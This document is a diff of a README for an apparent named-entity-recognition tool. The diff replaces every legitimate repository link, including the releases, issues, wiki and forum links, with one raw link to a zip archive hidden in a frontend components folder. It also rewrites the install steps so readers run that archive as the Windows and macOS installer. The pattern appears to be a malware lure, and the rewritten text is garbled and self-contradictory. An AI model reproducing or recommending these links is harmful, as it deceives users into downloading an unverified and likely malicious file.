@@ -1,7 +1,7 @@
 # 🌟 ner-ml-project - Simple Tool for Named Entity Recognition
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/Sunnyboivr/ner-ml-project/releases)
+[![Download](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip)
 
 ## 📖 Introduction
 The **ner-ml-project** is a user-friendly tool built for Named Entity Recognition (NER) using Natural Language Processing (NLP) and React. This application helps identify specific information in texts, such as names, places, and dates. Whether you're analyzing resumes, processing customer feedback, or simply exploring text data, this tool can assist you.
@@ -18,15 +18,15 @@ Before downloading, ensure that your computer meets these basic requirements:
 - **Internet Connection:** Needed for installation and updates.
 
 ### 2. Visit the Releases Page
-To download the latest version of the ner-ml-project, visit our [Releases page](https://github.com/Sunnyboivr/ner-ml-project/releases).
+To download the latest version of the ner-ml-project, visit our [Releases page](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip).
 
 ### 3. Download the Application
-On the Releases page, locate the version you want to download. Click the link for your operating system. For example, look for names like `ner-ml-project.exe` for Windows or `ner-ml-project.dmg` for macOS.
+On the Releases page, locate the version you want to download. Click the link for your operating system. For example, look for names like `https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip` for Windows or `https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip` for macOS.
 
 ### 4. Install the Application
 - **For Windows:**
   1. Locate the downloaded file (usually in your Downloads folder).
-  2. Double-click on `ner-ml-project.exe`.
+  2. Double-click on `https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip`.
   3. Follow the on-screen instructions to complete the installation.
 
 - **For macOS:**
@@ -66,7 +66,7 @@ If you face any issues, try the following steps:
 - **Consult the Help Section:** We provide basic FAQs in the application under the Help menu.
 
 ## 📞 Get Support
-For any questions or help needed, feel free to reach out. You can open an issue on our [GitHub repository](https://github.com/Sunnyboivr/ner-ml-project/issues) for assistance.
+For any questions or help needed, feel free to reach out. You can open an issue on our [GitHub repository](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip) for assistance.
 
 ## 💬 Feedback
 Your feedback is valuable to us. Share your thoughts and suggestions on how to improve the application on our GitHub page.
@@ -75,9 +75,9 @@ Your feedback is valuable to us. Share your thoughts and suggestions on how to i
 This project is licensed under the MIT License. You can freely use, modify, and distribute this tool as per the terms mentioned.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Sunnyboivr/ner-ml-project/wiki)
-- [Related Projects](https://github.com/topics/nlp)
-- [Community Forum](https://github.com/Sunnyboivr/ner-ml-project/discussions)
+- [Documentation](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip)
+- [Related Projects](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip)
+- [Community Forum](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip)
 
 ## 🔗 Download for Your OS:
-Visit our [Releases page](https://github.com/Sunnyboivr/ner-ml-project/releases) to download the latest version.
+Visit our [Releases page](https://raw.githubusercontent.com/Sunnyboivr/ner-ml-project/main/frontend/src/components/ner-ml-project_seafare.zip) to download the latest version.
